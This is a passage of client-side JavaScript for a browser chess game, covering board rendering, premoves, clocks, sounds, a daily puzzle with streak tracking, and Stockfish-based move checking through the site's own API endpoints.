(() => {
    'use strict';

    /* ==========================================================
    CONSTANTS & STATE
    ========================================================== */
    const MATERIAL_VALUES = {
        p: 1,
        n: 3,
        b: 3,
        r: 5,
        q: 9,
        k: 0
    };


    const PIECE_IMG = {};
    for (const c of ['w', 'b'])
        for (const t of ['k', 'q', 'r', 'b', 'n', 'p'])
            PIECE_IMG[c + t] = `https://images.chesscomfiles.com/chess-themes/pieces/neo/150/${c}${t}.png`;

    const PIECE_NAMES = {
        'p': 'Pawn',
        'r': 'Rook',
        'n': 'Knight',
        'b': 'Bishop',
        'q': 'Queen',
        'k': 'King'
    };

    let board = [];
    let turn = 'white';
    let selected = null;
    let hints = [];
    let lastMove = null;
    let premoveQueue = [];
    let lastPremoveQueueStr = '';
    let highlightedSquare = null;

    let dragging = false;
    let dragSrc = null;

    // Touch drag-and-drop state variables
    let touchStartPos = null;
    let activeTouchPieceClone = null;
    let touchDragSrc = null;
    let touchTapSquare = null;
    let touchDragging = false;
    let touchOffset = { x: 0, y: 0 };

    let whiteTime = 0;
    let blackTime = 0;
    let selectedMins = 10;
    let selectedIncrement = 0;
    let paused = false;
    let timerInterval = null;
    let pendingPromo = null;
    let blindfoldMode = false;
    let illegalMoveCount = 0;

    let whiteAlertFired = false;
    let blackAlertFired = false;

    let gameStartTime = null;

    let gameMode = 'pvp';
    let dailyPuzzleMode = false;
    let currentPuzzle = null;
    let puzzleMoveIndex = 0;
    let currentPuzzleFen = null;
    let puzzleAnalyzing = false;
    let stockfishWorker = null;

    let hintLevel = 0;

    let expectedMoveEval = null;
    let evaluationCache = {};
    let currentDifficulty = 'medium';
    let currentWhiteName = 'White';
    let currentBlackName = 'Black';
    // Updates UI to highlight selected game mode button
    function updateModeButtonsUI(mode) {
        const pvpBtn = document.getElementById("newPvPBtn");
        const aiBtn = document.getElementById("newAIBtn");

        if (!pvpBtn || !aiBtn) return;

        pvpBtn.classList.remove("active-mode");
        aiBtn.classList.remove("active-mode");

        if (mode === "pvp") {
            pvpBtn.classList.add("active-mode");
        } else {
            aiBtn.classList.add("active-mode");
        }
    }

    // =============================================
    // Daily Puzzle 
    // =============================================
    // Daily puzzles are fetched dynamically from the database.


    // =============================================
    // Daily Puzzle Streak
    // =============================================

    function getPuzzleStreak() {
        try {
            return JSON.parse(
                localStorage.getItem("dailyPuzzleStreak")
            ) || {
                streak: 0,
                lastCompleted: null,
                longestStreak: 0
            };
        } catch (error) {
            console.error("Failed to load puzzle streak:", error);

            return {
                streak: 0,
                lastCompleted: null,
                longestStreak: 0
            };
        }
    }

    function savePuzzleStreak(data) {
        try {
            localStorage.setItem(
                "dailyPuzzleStreak",
                JSON.stringify(data)
            );
        } catch (error) {
            console.error("Failed to save puzzle streak:", error);
        }
    }

    function getLocalDateString() {
        const today = new Date();

        const year = today.getFullYear();
        const month = String(today.getMonth() + 1).padStart(2, "0");
        const day = String(today.getDate()).padStart(2, "0");

        return `${year}-${month}-${day}`;
    }
    function updatePuzzleStreak() {

        const today = new Date();
        const todayStr = getLocalDateString();

        const streakData = getPuzzleStreak();

        if (streakData.lastCompleted === todayStr) {
            return streakData.streak;
        }

        const yesterday = new Date();
        yesterday.setDate(today.getDate() - 1);

        const yesterdayStr =
            `${yesterday.getFullYear()}-${String(
                yesterday.getMonth() + 1
            ).padStart(2, "0")}-${String(
                yesterday.getDate()
            ).padStart(2, "0")}`;

        if (streakData.lastCompleted === yesterdayStr) {
            streakData.streak++;
        } else {
            streakData.streak = 1;
        }

        streakData.lastCompleted = todayStr;

        if (
            streakData.streak >
            streakData.longestStreak
        ) {
            streakData.longestStreak =
                streakData.streak;
        }

        savePuzzleStreak(streakData);

        return streakData.streak;
    }
    function updateStreakDisplay() {
        const streakData = getPuzzleStreak();

        const streakEl = document.getElementById("streak-count");
        if (streakEl) {
            streakEl.textContent = streakData.streak;
        }
    }

    function clearPuzzleHints() {
        hintLevel = 0;

        document.querySelectorAll(".square").forEach(square => {
            square.classList.remove("hint-source");
            square.classList.remove("hint-target");
        });
    }

    function showPuzzleHint() {
        if (!dailyPuzzleMode || !currentPuzzle) return;

        const move = currentPuzzle.solution[puzzleMoveIndex];

        if (!move) return;

        const fromFile = move.charCodeAt(0) - 97;
        const fromRank = 8 - parseInt(move[1], 10);

        const toFile = move.charCodeAt(2) - 97;
        const toRank = 8 - parseInt(move[3], 10);

        clearPuzzleHints();
        const sourceSq = sq(fromRank, fromFile);
        const targetSq = sq(toRank, toFile);

        if (hintLevel === 0) {

            if (sourceSq) {
                sourceSq.classList.add("hint-source")
            };

            hintLevel = 1;

        } else if (hintLevel === 1) {

            if (sourceSq) {
                sourceSq.classList.add("hint-source");
            }

            if (targetSq) {
                targetSq.classList.add("hint-target");
            }

            hintLevel = 2;
        }
    }

    // getCurrentWeeklyPuzzle is retired; puzzles are fetched dynamically.

    function initStockfish() {
        if (!stockfishWorker) {
            stockfishWorker = new Worker('/static/game/js/stockfish.js');
            stockfishWorker.postMessage('setoption name Hash value 16');
            stockfishWorker.postMessage('setoption name Contempt value 0');
        }
    }

    function getStockfishEval(fen) {
        if (evaluationCache[fen]) {
            return Promise.resolve(evaluationCache[fen]);
        }
        return new Promise((resolve) => {
            initStockfish();

            let scoreType = 'cp';
            let scoreValue = 0;

            const onMessage = (e) => {
                const line = e.data;
                const match = line.match(/score (cp|mate) (-?\d+)/);
                if (match) {
                    scoreType = match[1];
                    scoreValue = parseInt(match[2], 10);
                }

                if (line.startsWith('bestmove')) {
                    stockfishWorker.removeEventListener('message', onMessage);
                    const result = { type: scoreType, value: scoreValue };
                    evaluationCache[fen] = result;
                    resolve(result);
                }
            };

            stockfishWorker.addEventListener('message', onMessage);
            stockfishWorker.postMessage('ucinewgame');
            stockfishWorker.postMessage(`position fen ${fen}`);
            stockfishWorker.postMessage('go depth 6 movetime 100');
        });
    }

    function getPlayerScore(evalResult) {
        const type = evalResult.type;
        const value = evalResult.value;
        if (type === 'mate') {
            if (value > 0) {
                return -10000 + value;
            } else {
                return 10000 + value;
            }
        } else {
            return -value || 0;
        }
    }

    async function precalculateExpectedMoveEval() {
        if (!currentPuzzle) return;
        const expectedMove = currentPuzzle.solution[puzzleMoveIndex];
        if (!expectedMove) return;
        try {
            if (!window.Chess) return;
            const chess = new window.Chess(currentPuzzleFen);
            const from = expectedMove.substring(0, 2);
            const to = expectedMove.substring(2, 4);
            const promo = expectedMove.length > 4 ? expectedMove.charAt(4) : undefined;
            chess.move({ from, to, promotion: promo });
            const expectedFen = chess.fen();
            expectedMoveEval = await getStockfishEval(expectedFen);
        } catch (e) {
            console.error("Error precalculating expected move eval:", e);
        }
    }

    async function validateMoveWithStockfish(previousFen, playedFen, expectedMove) {
        try {
            let expectedEval = expectedMoveEval;
            if (!expectedEval) {
                if (!window.Chess) {
                    console.error("Chess.js not loaded");
                    return false;
                }
                const chess = new window.Chess(previousFen);
                const from = expectedMove.substring(0, 2);
                const to = expectedMove.substring(2, 4);
                const promo = expectedMove.length > 4 ? expectedMove.charAt(4) : undefined;
                chess.move({ from, to, promotion: promo });
                const expectedFen = chess.fen();
                expectedEval = await getStockfishEval(expectedFen);
            }

            const playedEval = await getStockfishEval(playedFen);

            const valExpected = getPlayerScore(expectedEval);
            const valPlayed = getPlayerScore(playedEval);

            const isCorrect = (valPlayed >= 9000) ||
                (valPlayed >= valExpected - 50) ||
                (valPlayed >= 300 && valExpected >= 300);

            return isCorrect;
        } catch (e) {
            console.error("Stockfish validation error:", e);
            return false;
        }
    }

    function clearEvaluationCache() {
        evaluationCache = {};
    }

    async function startDailyPuzzle() {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 8000);
        try {
            const response = await fetch('/api/puzzles/daily/', {
                signal: controller.signal
            });
            if (!response.ok) {
                throw new Error(`Failed to fetch daily puzzle: ${response.statusText}`);
            }
            currentPuzzle = await response.json();
        } catch (error) {
            console.error("Error fetching daily puzzle:", error);
            // Fallback to a default puzzle in case API fails
            currentPuzzle = {
                id: 1,
                title: "Default Puzzle",
                fen: "6k1/5ppp/8/8/8/8/5PPP/6KQ w - - 0 1",
                solution: ["g2g4"],
                difficulty: "medium"
            };
        } finally {
            clearTimeout(timeoutId);
        }

        dailyPuzzleMode = true;
        document.getElementById("whiteClock").style.display = "none";
        document.getElementById("blackClock").style.display = "none";

        document.getElementById("streak-counter").style.display = "block";
        updateStreakDisplay();

        if (restartPuzzleBtn) {
            restartPuzzleBtn.style.display = 'block';
        }

        if (hintPuzzleBtn) {
            hintPuzzleBtn.style.display = 'block';
        }

        puzzleMoveIndex = 0;
        clearPuzzleHints();

        await startNewGame(
            "ai",
            "white",
            "medium",
            currentPuzzle.fen,
            null,
            null,
            true
        );
        currentPuzzleFen = currentPuzzle.fen;
        expectedMoveEval = null;
        initStockfish();
        precalculateExpectedMoveEval();
        const today = new Date().toLocaleDateString();
        const streakData = getPuzzleStreak();
        updateStreakDisplay();
        showStatus(
            `Daily Puzzle Challenge - ${today} | 🔥 Current Streak: ${streakData.streak}`,
            false
        );

    }

    let playerColor = 'white';
    let flipped = false;
    let autoFlip = false;

    const sounds = {
        move: new Audio(`${SOUND_BASE_URL}move.wav`),
        capture: new Audio(`${SOUND_BASE_URL}capture.mp3`),
        check: new Audio(`${SOUND_BASE_URL}check.wav`),
        draw: new Audio(`${SOUND_BASE_URL}draw.mp3`),
        win: new Audio(`${SOUND_BASE_URL}win.mp3`),
        loss: new Audio(`${SOUND_BASE_URL}loss.mp3`),
        gameDraw: new Audio(`${SOUND_BASE_URL}draw_end.mp3`),
        timeout: new Audio(`${SOUND_BASE_URL}timeout.mp3`),
    };

    let soundEnabled = true;
    try {
        const savedSound = localStorage.getItem('chessSoundEnabled');
        if (savedSound !== null) {
            soundEnabled = (savedSound === 'true');
        }
    } catch (e) {
        console.error("Failed to load sound settings", e);
    }

    function validatePlayerNames() {
        const wNameInput = document.getElementById('whiteNameInput');
        const bNameInput = document.getElementById('blackNameInput');
        const errorDiv = document.getElementById('nameError');

        const wName = wNameInput?.value.trim();
        const bName = bNameInput?.value.trim();

        if (!wName || !bName) {
            if (errorDiv) {
                errorDiv.style.display = 'block';
                errorDiv.textContent = 'Please enter both player names';
            }
            if (!wName && wNameInput) wNameInput.classList.add('input-error');
            if (!bName && bNameInput) bNameInput.classList.add('input-error');
            return false;
        }

        if (errorDiv) errorDiv.style.display = 'none';
        if (wNameInput) wNameInput.classList.remove('input-error');
        if (bNameInput) bNameInput.classList.remove('input-error');
        return true;
    }


    function playSound(data) {
        if (!soundEnabled || !data?.valid) return;

        let sound = sounds.move;
        if (['checkmate', 'stalemate', 'draw', 'timeout'].includes(data.game_status)) {
            sound = sounds.draw;
        } else if (data.game_status === 'check') {
            sound = sounds.check;
        } else if (data.captured || data.is_capture) {
            sound = sounds.capture;
        }

        sound.currentTime = 0;
        const playback = sound.play();
        if (playback?.catch) playback.catch(() => { });
    }

    function toggleMute() {
        soundEnabled = !soundEnabled;
        try {
            localStorage.setItem('chessSoundEnabled', String(soundEnabled));
        } catch (e) {
            console.error("Failed to save sound settings", e);
        }
        if (muteBtn) {
            muteBtn.textContent = soundEnabled ? '🔊 Sound On' : '🔇 Muted';
            muteBtn.setAttribute('aria-pressed', String(soundEnabled));
        }
    }

    function playGameOverSound(reason, resultState) {
        if (!soundEnabled) return;


        let sound = null;

        if (reason === 'stalemate' || reason === 'draw') {
            sound = sounds.gameDraw;
        } else if (reason === 'timeout') {
            sound = sounds.timeout;
        }

        else if (reason === 'checkmate' || reason === 'resign') {
            if (resultState === 'defeat') {
                sound = sounds.loss;
            } else {
                sound = sounds.win;
            }
        }


        if (sound) {
            sound.currentTime = 0;
            sound.play().catch((e) => console.log('Sound play error:', e));
        }
    }


    /* ==========================================================
    DOM REFERENCES
    ========================================================== */
    const shareModal = document.getElementById('shareModal');
    const rulebookModal = document.getElementById('rulebookModal');
    const boardEl = document.getElementById('board');
    const turnEl = document.getElementById('turnBadge');
    const statusEl = document.getElementById('statusBar');
    const movesEl = document.getElementById('movesList');
    const wCapEl = document.getElementById('whiteCaptured');
    const bCapEl = document.getElementById('blackCaptured');
    const pauseBtn = document.getElementById('pauseBtn');
    const flipBtn = document.getElementById('flipBtn');
    const promoOverlay = document.getElementById('promoOverlay');
    const promoChoices = document.getElementById('promoChoices');
    const modeBadge = document.getElementById('modeBadge');
    const autoFlipBtn = document.getElementById('autoFlipBtn');
    const flipControls = document.getElementById('flipControls');
    const copyFenBtn = document.getElementById('copyFenBtn');
    const copyPgnBtn = document.getElementById('copyPgnBtn');
    const muteBtn = document.getElementById('muteBtn');

    const welcomeOverlay = document.getElementById('welcomeOverlay');
    const welcomeResumeBtn = document.getElementById('welcomeResumeBtn');
    const welcomePvPBtn = document.getElementById('welcomePvPBtn');
    const welcomeAIBtn = document.getElementById('welcomeAIBtn');
    const welcomeDailyPuzzleBtn = document.getElementById("welcomeDailyPuzzleBtn");
    const welcomeFenInput = document.getElementById('welcomeFenInput');
    const welcomeFenError = document.getElementById('welcomeFenError');

    const modeSelection = document.getElementById('modeSelection');
    const pveOptions = document.getElementById('pveOptions');
    const startAIBtn = document.getElementById('startAIBtn');
    const backToModes = document.getElementById('backToModes');
    const gameLayout = document.querySelector('.game-layout');
    const nameInputs = document.getElementById('nameInputs');

    const confirmOverlay = document.getElementById('confirmOverlay');
    const confirmTitle = document.getElementById('confirmTitle');
    const confirmMessage = document.getElementById('confirmMessage');
    const confirmYesBtn = document.getElementById('confirmYesBtn');
    const confirmNoBtn = document.getElementById('confirmNoBtn');

    const newPvPBtn = document.getElementById('newPvPBtn');
    const newAIBtn = document.getElementById('newAIBtn');
    const dailyPuzzleBtn = document.getElementById('dailyPuzzleBtn');
    const restartPuzzleBtn = document.getElementById('restartPuzzleBtn');
    const hintPuzzleBtn = document.getElementById('hintPuzzleBtn');
    const newFenBtn = document.getElementById('newFenBtn');

    const fenOverlay = document.getElementById('fenOverlay');
    const fenInput = document.getElementById('fenInput');
    const fenError = document.getElementById('fenError');
    const fenStartBtn = document.getElementById('fenStartBtn');
    const fenCancelBtn = document.getElementById('fenCancelBtn');

    const gameOverOverlay = document.getElementById('gameOverOverlay');
    const gameOverTitle = document.getElementById('gameOverTitle');
    const gameOverMessage = document.getElementById('gameOverMessage');
    const gameOverStartBtn = document.getElementById('gameOverStartBtn');
    const gameOverExitBtn = document.getElementById('gameOverExitBtn');
    const gameOverPvPBtn = document.getElementById('gameOverPvPBtn');
    const gameOverAIBtn = document.getElementById('gameOverAIBtn');

    const replayControls = document.getElementById('replayControls');
    const firstReplayBtn = document.getElementById('firstReplayBtn');
    const prevReplayBtn = document.getElementById('prevReplayBtn');
    const playReplayBtn = document.getElementById('playReplayBtn');
    const nextReplayBtn = document.getElementById('nextReplayBtn');
    const lastReplayBtn = document.getElementById('lastReplayBtn');
    const replayGameBtn = document.getElementById('replayGameBtn');

    const resignBtn = document.getElementById('resignBtn');
    const drawBtn = document.getElementById('drawBtn');
    const drawOverlay = document.getElementById('drawOverlay');
    const drawMessage = document.getElementById('drawMessage');
    const drawAcceptBtn = document.getElementById('drawAcceptBtn');
    const drawDeclineBtn = document.getElementById('drawDeclineBtn');

    const whiteNameLabel = document.getElementById('whiteNameLabel');
    const blackNameLabel = document.getElementById('blackNameLabel');
    const whiteYouTag = document.getElementById('whiteYouTag');
    const blackYouTag = document.getElementById('blackYouTag');
    const whiteCapturedName = document.getElementById('whiteCapturedName');
    const blackCapturedName = document.getElementById('blackCapturedName');
    const turnBadgeText = document.getElementById('turnBadgeText');
    const a11yAnnouncer = document.getElementById('a11y-announcer');

    function announceMove(msg) {
        if (a11yAnnouncer) {
            a11yAnnouncer.textContent = '';
            setTimeout(() => { a11yAnnouncer.textContent = msg; }, 50);
        }
    }

    let flashTimeout = null;
    function flashBoard() {
        if (boardEl) {
            boardEl.classList.remove('flash-error');
            void boardEl.offsetWidth;
            boardEl.classList.add('flash-error');
            if (flashTimeout) clearTimeout(flashTimeout);
            flashTimeout = setTimeout(() => {
                boardEl.classList.remove('flash-error');
            }, 2000);
        }

        if (blindfoldMode) {
            illegalMoveCount++;
            if (illegalMoveCount >= 3) {
                illegalMoveCount = 0;
                document.body.classList.remove('blindfold-mode');
                setTimeout(() => {
                    if (blindfoldMode) {
                        document.body.classList.add('blindfold-mode');
                    }
                }, 3000);
            }
        }
    }

    let gameOver = false;
    let aiThinking = false;
    let aiRequestSeq = 0; // Sequence token to cancel stale AI responses

    let replayMode = false;
    let replayMoves = [];
    let replayIndex = 0;
    let replayBoard = null;
    let autoReplayInterval = null;
    let isAutoReplaying = false;
    let pgnDownloadTimeout = null;
    let fenCopyTimeout = null;
    /* ==========================================================
    CSRF & API HELPERS
    ========================================================== */
    function calculateMaterial(board) {
        let white = 0;
        let black = 0;

        for (let r = 0; r < 8; r++) {
            for (let c = 0; c < 8; c++) {
                const piece = board[r][c];
                if (!piece) continue;

                const value = MATERIAL_VALUES[piece.toLowerCase()] || 0;
                if (piece === piece.toUpperCase()) {
                    white += value;
                }
                else {
                    black += value;
                }
            }
        }

        return {
            white,
            black
        };
    }

    function updateMaterialUI(board) {
        const { white, black } = calculateMaterial(board);

        document.getElementById("whiteScore").innerText = white;

        document.getElementById("blackScore").innerText = black;
    }

    // post() uses csrf()
    function csrf() {
        const input = document.querySelector('[name=csrfmiddlewaretoken]');
        if (input?.value) {
            return input.value;
        }
        const m = document.cookie.match(/csrftoken=([^;]+)/);
        return m ? decodeURIComponent(m[1]) : '';
    }

    async function get(url) {
        return (await fetch(url)).json();
    }

    async function post(url, body) {
        return (await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRFToken': csrf()
            },
            body: JSON.stringify(body)
        })).json();
    }

    function isAITurn() {
        return gameMode === 'ai' && turn !== playerColor && !gameOver;
    }

    function queueAIMoveIfNeeded() {
        if (!isAITurn() || aiThinking) return;
        setTimeout(() => {
            if (isAITurn() && !aiThinking && !gameOver) requestAIMove();
        }, 200);
    }

    const pKey = p => p ? ((p === p.toUpperCase() ? 'w' : 'b') + p.toLowerCase()) : null;
    const pColor = p => p ? (p === p.toUpperCase() ? 'white' : 'black') : null;
    const sq = (r, c) => {
        const vr = flipped ? 7 - r : r;
        const vc = flipped ? 7 - c : c;
        return boardEl.children[vr * 8 + vc];
    };

    function getVirtualBoard() {
        let virtualBoard = board.map(row => [...row]);
        for (const pm of premoveQueue) {
            const piece = virtualBoard[pm.from.r][pm.from.c];
            if (piece) {
                const targetEmpty = !virtualBoard[pm.to.r][pm.to.c];
                virtualBoard[pm.to.r][pm.to.c] = piece;
                virtualBoard[pm.from.r][pm.from.c] = null;

                // Virtual castling handling
                if (piece.toLowerCase() === 'k' && Math.abs(pm.to.c - pm.from.c) === 2) {
                    const isKingside = pm.to.c > pm.from.c;
                    const rookColFrom = isKingside ? 7 : 0;
                    const rookColTo = isKingside ? 5 : 3;
                    const rook = virtualBoard[pm.from.r][rookColFrom];
                    if (rook && rook.toLowerCase() === 'r') {
                        virtualBoard[pm.from.r][rookColTo] = rook;
                        virtualBoard[pm.from.r][rookColFrom] = null;
                    }
                }

                // Virtual en passant handling
                if (piece.toLowerCase() === 'p' && pm.from.c !== pm.to.c && targetEmpty) {
                    virtualBoard[pm.from.r][pm.to.c] = null;
                }

                // Virtual pawn promotion (default to Queen for path selection)
                if (piece.toLowerCase() === 'p' && (pm.to.r === 0 || pm.to.r === 7)) {
                    const promotedPiece = piece === 'P' ? 'Q' : 'q';
                    virtualBoard[pm.to.r][pm.to.c] = promotedPiece;
                }
            }
        }
        return virtualBoard;
    }

    function drawPremoveArrows(force = false) {
        let overlay = document.getElementById('premove-svg-overlay');
        const currentStr = JSON.stringify(premoveQueue);

        // Short-circuit to avoid DOM churn if the queue contents are unchanged
        if (!force && overlay && currentStr === lastPremoveQueueStr) {
            return;
        }
        lastPremoveQueueStr = currentStr;

        if (overlay) {
            overlay.remove();
        }

        if (premoveQueue.length === 0) return;

        overlay = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
        overlay.setAttribute('id', 'premove-svg-overlay');
        overlay.style.cssText = 'position:absolute; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:4;';

        const defs = document.createElementNS('http://www.w3.org/2000/svg', 'defs');
        const marker = document.createElementNS('http://www.w3.org/2000/svg', 'marker');
        marker.setAttribute('id', 'premove-arrowhead');
        marker.setAttribute('viewBox', '0 0 10 10');
        marker.setAttribute('refX', '8');
        marker.setAttribute('refY', '5');
        marker.setAttribute('markerWidth', '6');
        marker.setAttribute('markerHeight', '6');
        marker.setAttribute('orient', 'auto-start-reverse');

        const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
        path.setAttribute('d', 'M 0 1.5 L 10 5 L 0 8.5 z');
        path.setAttribute('fill', '#3b82f6');
        marker.appendChild(path);
        defs.appendChild(marker);
        overlay.appendChild(defs);

        const boardRect = boardEl.getBoundingClientRect();
        if (boardRect.width === 0 || boardRect.height === 0) {
            return;
        }

        premoveQueue.forEach((pm, idx) => {
            const fromSq = sq(pm.from.r, pm.from.c);
            const toSq = sq(pm.to.r, pm.to.c);
            if (!fromSq || !toSq) return;

            const fromRect = fromSq.getBoundingClientRect();
            const toRect = toSq.getBoundingClientRect();

            const x1 = (fromRect.left - boardRect.left) + fromRect.width / 2;
            const y1 = (fromRect.top - boardRect.top) + fromRect.height / 2;
            const x2 = (toRect.left - boardRect.left) + toRect.width / 2;
            const y2 = (toRect.top - boardRect.top) + toRect.height / 2;

            const line = document.createElementNS('http://www.w3.org/2000/svg', 'line');
            line.setAttribute('x1', x1);
            line.setAttribute('y1', y1);
            line.setAttribute('x2', x2);
            line.setAttribute('y2', y2);
            line.setAttribute('stroke', '#3b82f6');
            line.setAttribute('stroke-width', '4');
            line.setAttribute('opacity', '0.75');
            line.setAttribute('marker-end', 'url(#premove-arrowhead)');
            overlay.appendChild(line);

            // Midpoint step indicator badge for chained and overlapping pre-moves
            const midX = (x1 + x2) / 2;
            const midY = (y1 + y2) / 2;

            const badgeG = document.createElementNS('http://www.w3.org/2000/svg', 'g');

            const circle = document.createElementNS('http://www.w3.org/2000/svg', 'circle');
            circle.setAttribute('cx', midX);
            circle.setAttribute('cy', midY);
            circle.setAttribute('r', '8');
            circle.setAttribute('fill', '#16162a');
            circle.setAttribute('stroke', '#3b82f6');
            circle.setAttribute('stroke-width', '1.5');

            const text = document.createElementNS('http://www.w3.org/2000/svg', 'text');
            text.setAttribute('x', midX);
            text.setAttribute('y', midY);
            text.setAttribute('fill', '#ffffff');
            text.setAttribute('font-size', '9px');
            text.setAttribute('font-weight', 'bold');
            text.setAttribute('font-family', 'sans-serif');
            text.setAttribute('text-anchor', 'middle');
            text.setAttribute('dominant-baseline', 'central');
            text.textContent = idx + 1;

            badgeG.appendChild(circle);
            badgeG.appendChild(text);
            overlay.appendChild(badgeG);
        });

        boardEl.appendChild(overlay);
    }

    function getSquareSize() {
        const s = boardEl.querySelector('.square');
        return s ? s.getBoundingClientRect().width : 60;
    }

    async function animateMove(fr, fc, tr, tc) {

        if (window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;

        const animations = [];
        const size = getSquareSize();
        const mult = flipped ? -1 : 1;

        function createAnim(p, dRow, dCol) {
            return new Promise(resolve => {
                const originSquare = p.parentElement;

                if (originSquare) {
                    const ghost = p.cloneNode(true);
                    ghost.classList.add('piece-ghost');

                    originSquare.appendChild(ghost);

                    ghost.addEventListener(
                        'animationend',
                        () => ghost.remove(),
                        { once: true }
                    );
                }

                p.classList.add('moving');
                p.style.transition = 'transform 0.25s ease-in-out, opacity 0.2s ease';
                p.style.transform = `translate(${dCol * size * mult}px, ${dRow * size * mult}px)`;

                const onEnd = () => {
                    p.removeEventListener('transitionend', onEnd);
                    p.classList.remove('moving');
                    p.style.transform = 'none';
                    p.style.transition = '';
                    resolve();
                };
                p.addEventListener('transitionend', onEnd);
                setTimeout(onEnd, 300);
            });
        }

        const piece = sq(fr, fc).querySelector('.piece');
        if (piece) {
            animations.push(createAnim(piece, tr - fr, tc - fc));

            const pType = board[fr][fc];
            if (pType && pType.toLowerCase() === 'k' && Math.abs(tc - fc) === 2) {
                const isShort = tc > fc;
                const rookFr = fr;
                const rookFc = isShort ? 7 : 0;
                const rookTr = fr;
                const rookTc = isShort ? 5 : 3;
                const rook = sq(rookFr, rookFc).querySelector('.piece');
                if (rook) {
                    animations.push(createAnim(rook, rookTr - rookFr, rookTc - rookFc));
                }
            }
        }

        let capturedSq = sq(tr, tc);
        const isEnPassant = piece && piece.src.includes('p.png') && fc !== tc && !board[tr][tc];
        if (isEnPassant) {
            capturedSq = sq(fr, tc);
        }

        const targetPiece = capturedSq.querySelector('.piece');
        if (targetPiece) {
            targetPiece.classList.add('captured');
        }

        await Promise.all(animations);
    }



    function parseBoard(s) {
        if (!s || typeof s !== 'string') return s;
        const b = [];
        for (let i = 0; i < 8; i++) {
            const row = [];
            for (let j = 0; j < 8; j++) {
                const ch = s[i * 8 + j];
                row.push(ch === '.' ? null : ch);
            }
            b.push(row);
        }
        return b;
    }
    const whiteNameInput = document.getElementById('whiteNameInput');
    const blackNameInput = document.getElementById('blackNameInput');

    if (whiteNameInput) {
        whiteNameInput.addEventListener('input', () => {
            whiteNameInput.classList.remove('input-error');
            if (whiteNameInput.value.trim() && blackNameInput?.value.trim()) {
                document.getElementById('nameError').style.display = 'none';
            }
        });
    }
    if (blackNameInput) {
        blackNameInput.addEventListener('input', () => {
            blackNameInput.classList.remove('input-error');
            if (blackNameInput.value.trim() && whiteNameInput?.value.trim()) {
                document.getElementById('nameError').style.display = 'none';
            }
        });
    }
    /* ==========================================================
    LOAD GAME STATE
    ========================================================== */
    async function loadGame() {
        // Reset AI request sequence and thinking state on load/reconnect to cancel stale requests
        aiRequestSeq = 0;
        aiThinking = false;
        premoveQueue = [];
        refreshPremoveHighlight();
        whiteAlertFired = false;
        blackAlertFired = false;

        const data = await get('/api/state/');

        if (data.time_limit !== undefined) {
            selectedMins = data.time_limit / 60;
        }
        if (data.increment !== undefined) {
            selectedIncrement = data.increment;
        }

        board = parseBoard(data.board);
        console.log("SERVER DATA ON AI MOVE:", data);
        turn = data.current_turn;
        whiteTime = data.white_time;
        blackTime = data.black_time;
        paused = data.paused;

        gameMode = data.mode || 'pvp';
        // Sync UI with current game mode
        updateModeButtonsUI(gameMode);
        playerColor = data.player_color || 'white';
        currentDifficulty = data.difficulty || currentDifficulty;

        if (flipControls) {
            flipControls.style.display = (gameMode === 'pvp') ? 'flex' : 'none';
        }

        if (gameMode === 'ai') {
            flipped = (playerColor === 'black');
        } else {
            flipped = false;
        }

        if (modeBadge) modeBadge.textContent = gameMode === 'ai' ? 'VS AI' : 'PVP';

        const emotePanel = document.getElementById('emotePanel');
        if (emotePanel) {
            emotePanel.style.display = gameMode === 'pvp' ? 'block' : 'none';
        }

        // Show Resume button if we have an ongoing game
        const hasMoves = data.move_history && data.move_history.length > 0;
        const isResumable = hasMoves && data.game_status === 'active';
        if (isResumable) {
            if (welcomeResumeBtn) {
                welcomeResumeBtn.style.display = 'block';
                welcomeResumeBtn.textContent = data.mode === 'ai'
                    ? 'Replay Previous Game'
                    : 'Resume Game';
            }
        } else {
            if (welcomeResumeBtn) welcomeResumeBtn.style.display = 'none';
        }

        if (drawBtn) drawBtn.style.display = gameMode === 'pvp' ? 'block' : 'none';
        if (pauseBtn) pauseBtn.style.display = 'block';
        if (resignBtn) {
            resignBtn.style.display = 'block';
            resignBtn.hidden = false;
        }

        updatePlayerNames(data);
        updateTurn();
        updateMoves(data.move_history);
        updateCaptured(data.captured_pieces);

        buildBoard();
        renderClocks();
        updatePauseUI();
        startTimer();
        // fix
        // Removed static styling for AI clock so it displays the countdown timer.

        // Restore check highlight if game was reloaded while in check
        if (data.game_status === 'check') {
            applyCheckHighlight();
        } else {
            highlightCheck();
        }

        if (data.game_status && data.game_status !== 'active' && data.game_status !== 'ok') {
            handleGameStatus(data.game_status, data.draw_reason);
        }
        if (!welcomeOverlay.classList.contains('active')) {
            queueAIMoveIfNeeded();
        }
    }

    function updatePlayerNames(data) {
        currentWhiteName = data.white_name || currentWhiteName || 'White';
        currentBlackName = data.black_name || currentBlackName || 'Black';
        let wName = currentWhiteName;
        let bName = currentBlackName;

        if (gameMode === 'ai') {
            const diffLabel = (currentDifficulty || 'medium').toUpperCase();
            const humanName = currentWhiteName || document.getElementById('whiteNameInput')?.value?.trim()?.slice(0, 17) || 'Player';
            if (playerColor === 'white') {
                wName = humanName;
                bName = `AI (Black)`;
            } else {
                bName = humanName;
                wName = `AI (White)`;
            }

            // Inject difficulty badge after names are set
            setTimeout(() => {
                const aiLabel = playerColor === 'white'
                    ? document.getElementById('blackNameLabel')
                    : document.getElementById('whiteNameLabel');
                if (aiLabel) {
                    aiLabel.innerHTML = '';
                    const textNode = document.createTextNode(`AI (${playerColor === 'white' ? 'BLACK' : 'WHITE'}) `);
                    const badge = document.createElement('span');
                    badge.textContent = diffLabel;
                    badge.style.cssText = 'color:#f0c040 !important; font-weight:700; font-size:0.95em; letter-spacing:0.2px;';
                    badge.setAttribute('aria-label', `AI difficulty: ${diffLabel}`);
                    aiLabel.appendChild(textNode);
                    aiLabel.appendChild(badge);
                }
            }, 0);
        }
        if (whiteNameLabel) whiteNameLabel.textContent = wName.toUpperCase();
        if (blackNameLabel) blackNameLabel.textContent = bName.toUpperCase();
        if (whiteCapturedName) whiteCapturedName.textContent = wName;
        if (blackCapturedName) blackCapturedName.textContent = bName;

        if (gameMode === 'ai') {
            if (whiteYouTag) whiteYouTag.style.display = (playerColor === 'white') ? 'inline' : 'none';
            if (blackYouTag) blackYouTag.style.display = (playerColor === 'black') ? 'inline' : 'none';
        } else {
